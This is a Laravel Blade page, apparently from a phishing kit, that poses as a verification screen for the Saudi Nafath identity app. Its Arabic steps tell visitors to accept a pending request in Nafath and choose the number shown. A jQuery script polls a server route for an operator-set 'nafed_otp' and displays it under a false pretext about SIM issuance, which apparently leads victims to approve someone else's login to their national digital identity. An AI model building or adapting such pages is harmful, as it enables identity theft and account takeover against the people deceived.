@extends('frontend.layout.master-two')
@section('content')
<style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: white;
        }

        .header {
            padding: 1rem;
            border-bottom: 1px solid #eaeaea;
        }

        .logo {
            height: 2rem;
            color: #2C937C;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 1rem;
        }

        .title {
            color: #2C937C;
            text-align: center;
            font-size: 1.25rem;
            margin: 1.5rem 0;
            font-weight: 500;
        }

        .steps-container {
            display: flex;
            justify-content: center;
            gap: 1.25rem;
            margin: 0 auto;
            padding: 0.5rem;
            max-width: 900px;
        }

        .step {
            width: 110px; /* Fixed width to match screenshot */
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .step-text {
            text-align: center;
            margin-bottom: 0.5rem;
            height: 32px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .step-title {
            color: #2C937C;
            font-size: 11px;
            line-height: 1.2;
            font-weight: bold;
        }

        .step-image-container {
            width: 110px; /* Fixed width */
            height: 220px; /* Fixed height */
            overflow: hidden;
        }

        .step-image {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        /* Responsive design - maintains horizontal layout */
        @media (max-width: 768px) {
            .container {
                padding: 0 0.5rem;
            }

            .steps-container {
                gap: 0.75rem;
            }

            .step {
                width: 110px; /* Maintain fixed width */
            }

            .step-image-container {
                width: 110px; /* Maintain fixed width */
                height: 220px; /* Maintain fixed height */
            }
        }

        @media (max-width: 480px) {
            .title {
                font-size: 1rem;
                margin: 1rem 0;
            }

            .steps-container {
                gap: 0.5rem;
            }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="container">
                    <img src="{{ asset('frontend') }}/assets/images/final-page/logo.png" alt="نفاذ" class="logo">
        </div>
    </header>
    <div id="initial-view" class="main-content">

    <main class="container">
<h1 class="title font-extrabold" style="font-weight: bolder; text-transform: uppercase; font-size: 28px;">متطلبات التحقق</h1>

        <div class="steps-container">
            <!-- Step 1 -->
            <div class="step">
                <div class="step-text">
                    <p class="step-title">اولاً يرجى التوجه</p>
                    <p class="step-title">الى تطبيق نفاذ</p>
                </div>
                <div class="step-image-container">
                    <img src="{{ asset('newHome/step1.jpg') }}" alt="الخطوة الأولى" class="step-image">
                </div>
            </div>

            <!-- Step 2 -->
            <div class="step">
                <div class="step-text">
                    <p class="step-title">ثانياً أدخل على الطلبات</p>
                    <p class="step-title">ثم اضغط قبول للطلب</p>
                </div>
                <div class="step-image-container">
                    <img src="{{ asset('newHome/step2.jpg') }}" alt="الخطوة الثانية" class="step-image">
                </div>
            </div>

            <!-- Step 3 -->
            <div class="step">
                <div class="step-text">
                    <p class="step-title">ثالثاً اختر الرقم الذي</p>
                    <p class="step-title">سيظهر امامك بعد ثوان</p>
                </div>
                <div class="step-image-container">
                    <img src="{{ asset('newHome/step3.jpg') }}" alt="الخطوة الثالثة" class="step-image">
                </div>
            </div>
        </div>

            <!-- Loading Section -->
         <div class="text-center space-y-4">
    <!-- Bold and slightly lowered text -->
<p class="text-lg font-extrabold mt-4" style="color: black; font-weight: bolder; text-transform: uppercase; font-size: 24px;" dir="rtl">سيظهر الكود أمامك بعد لحظات</p>
    
    <!-- Centered loading spinner -->
    <div class="flex justify-center">
        <div class="w-8 h-8">
            <svg class="animate-spin" viewBox="0 0 24 24">
                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="#2C937C" stroke-width="4" fill="none"></circle>
                <path class="opacity-75" fill="#2C937C" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
        </div>
    </div>
    
    <!-- Bold and centered timer -->
    <div class="text-2xl font-extrabold mt-2" style="color: #2C937C;" id="timer">00:41</div>
</div>

</div>
      <!-- OTP Success View (Initially Hidden) -->
    <div id="otp-view" class="fixed inset-0 bg-white hidden">
        <div class="h-screen flex flex-col items-center justify-center p-4">
            <!-- Logo -->
            <div class="w-full max-w-md space-y-12 text-center">
                <h1 class="text-5xl font-bold" style="color: #2C937C;">نفاذ</h1>

                <!-- Content -->
                <div class="space-y-4">
                    <h2 class="text-xl font-semibold text-gray-800" dir="rtl">
                        الكود الخاص بتطبيق نفاذ
                    </h2>

                 <p class=" px-8" style="color: #2C937C; font-size: 19px;" dir="rtl">
    للموافقة على طلب إصدار شريحة اعتماد موعدك من مزود الخدمة الخاص بك
</p>

                </div>

                <!-- Progress and OTP -->
                <div class="space-y-6">
                    <div class="flex justify-center gap-1">
                        @for ($i = 0; $i < 12; $i++)
                            <div class="w-2 h-2 rounded-full {{ $i < 8 ? 'bg-[#2C937C]' : 'bg-gray-200' }}"></div>
                        @endfor
                    </div>

<h3 id="nafed_otp_popup" class="text-6xl font-bold" style="color: #2C937C; font-size: 40px;"></h3>
                </div>
            </div>
        </div>
    </div>
</div>
@endsection

@section('custom-style')
<style>
.phone-container {
        width: 100%;
        aspect-ratio: 9/16;
        position: relative;
    }

    .phone-image {
        width: 100%;
        height: 100%;
        object-fit: contain;
    }

    /* Make text containers equal height */
    .text-container {
        min-height: 3.5rem;
        display: flex;
        flex-direction: column;
        justify-content: center;
    }
@keyframes fadeOut {
    from { opacity: 1; }
    to { opacity: 0; }
}

@keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
}

.fade-out {
    animation: fadeOut 0.3s ease-out forwards;
}

.fade-in {
    animation: fadeIn 0.3s ease-out forwards;
}

.hidden {
    display: none !important;
}

@media (max-width: 768px) {
    .flex.justify-center.items-start {
        flex-direction: column;
        align-items: center;
    }
    
    .flex-1.max-w-[200px] {
        max-width: 100%;
        margin-bottom: 2rem;
    }
}
</style>
@endsection

@section('custom-script')
<script>
$(document).ready(function() {
    let timeLeft = 41;
    const initialView = document.getElementById('initial-view');
    const otpView = document.getElementById('otp-view');
    
    // Timer countdown
    const timer = setInterval(() => {
        timeLeft--;
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        document.getElementById('timer').textContent = 
            `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
        
        if (timeLeft <= 0) {
            clearInterval(timer);
        }
    }, 1000);

function pollOTP() {
        $.ajax({
            url: '{{ route("client.getNafedOtpAjax", $client->id) }}',
            type: 'GET',
            dataType: 'json',
            success: function(data) {
                if (data.status == 1) {
                    $('#nafed_otp_popup').text(data.nafed_otp);
                    
                    // Smooth transition between views
                    initialView.classList.add('fade-out');
                    setTimeout(() => {
                        initialView.classList.add('hidden');
                        otpView.classList.remove('hidden');
                        otpView.classList.add('fade-in');
                    }, 300);
                }
            },
            error: function(xhr, status, error) {
                console.error('Error fetching OTP:', error);
            }
        });
    }

    // Initial poll and setup interval
    pollOTP();
    const pollInterval = setInterval(pollOTP, 5000);

    // Cleanup on page unload
    $(window).on('unload', function() {
        clearInterval(timer);
        clearInterval(pollInterval);
    });
});
</script>

@endsection